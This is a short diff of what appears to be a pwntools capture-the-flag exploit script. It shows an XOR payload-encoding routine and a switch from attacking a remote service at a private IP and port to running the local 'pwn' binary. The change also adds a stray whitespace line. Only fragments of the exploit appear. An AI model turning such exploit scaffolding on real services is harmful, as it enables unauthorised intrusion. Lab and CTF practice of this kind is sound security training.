@@ -18,9 +18,10 @@ def encode(payload):
     for i in range(len(payload)-1):
         ret = chr(ord(payload[len(payload) - i - 2]) ^ ord(ret[0])) + ret
     return ret
+	
 def main():
-    #p = process('./pwn-bak')
-    p = remote('172.16.9.24', 9017)
+    p = process('./pwn')
+    # p = remote('172.16.9.24', 9017)
     p.recvuntil('>')
     p.send('\x00')
     p.recvuntil('>')
